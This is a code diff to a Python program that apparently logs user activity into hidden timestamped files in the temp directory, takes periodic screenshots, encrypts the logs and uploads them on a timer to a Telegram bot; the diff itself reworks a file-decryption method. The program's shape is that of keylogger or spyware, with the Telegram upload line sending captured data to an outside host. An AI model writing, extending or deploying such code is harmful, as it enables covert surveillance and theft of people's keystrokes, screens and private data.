@@ -30,7 +30,7 @@ SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots (in seconds)
 temp_dir = gettempdir()
 FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
 ENCRYPTED_FILENAME = f'{FILENAME}.enc'
-SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')
+DECRYPTED_FILENAME = f'{FILENAME}.decrypted'  # Path for the decrypted file
 
 # Generate a key for encryption
 key = Fernet.generate_key()
@@ -127,6 +127,26 @@ class Uploader:
         except Exception as e:
             alarm(f'Encryption Error: {e}')
 
+    def decrypt_file(self, encrypted_file_path: str, decrypted_file_path: str) -> None:
+        try:
+            # Initialize Fernet with the key
+            cipher_suite = Fernet(key)
+
+            # Read and decrypt the file
+            with open(encrypted_file_path, "rb") as f:
+                encrypted_data = f.read()
+            decrypted_data = cipher_suite.decrypt(encrypted_data)
+
+            # Save the decrypted data to a file
+            with open(decrypted_file_path, "wb") as f:
+                f.write(decrypted_data)
+            print(f"File decrypted: {decrypted_file_path}")  # Debug: Print success message
+
+        except FileNotFoundError:
+            print(f"Error: File not found. Check the path for the encrypted file.")
+        except Exception as e:
+            print(f"Error decrypting file: {e}")
+
     def upload_file_periodically(self) -> None:
         sleep(INTERVAL)
 
@@ -135,6 +155,10 @@ class Uploader:
                 if exists(FILENAME):
                     self.encrypt_file(FILENAME)
                     if exists(self.encrypted_filename):  # Check if the encrypted file exists
+                        # Decrypt the file after encryption
+                        self.decrypt_file(self.encrypted_filename, DECRYPTED_FILENAME)
+
+                        # Upload the encrypted file to Telegram
                         with open(self.encrypted_filename, 'rb') as fh:
                             files = {'document': fh}
                             resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
@@ -150,25 +174,6 @@ class Uploader:
 
             except Exception as e:
                 alarm(f'Error Occurred: {e}')
-
-    def decrypt_file(self, encrypted_file_path: str, key: bytes) -> None:
-        try:
-            # Initialize Fernet with the key
-            cipher_suite = Fernet(key)
-
-            # Read and decrypt the file
-            with open(encrypted_file_path, "rb") as f:
-                encrypted_data = f.read()
-            decrypted_data = cipher_suite.decrypt(encrypted_data)
-
-            # Print the decrypted data
-            print("Decrypted data:")
-            print(decrypted_data.decode('utf-8'))  # Decode bytes to string
-
-        except FileNotFoundError:
-            print(f"Error: File not found. Check the path for the encrypted file.")
-        except Exception as e:
-            print(f"Error decrypting file: {e}")
 
     def __del__(self) -> None:
         pass
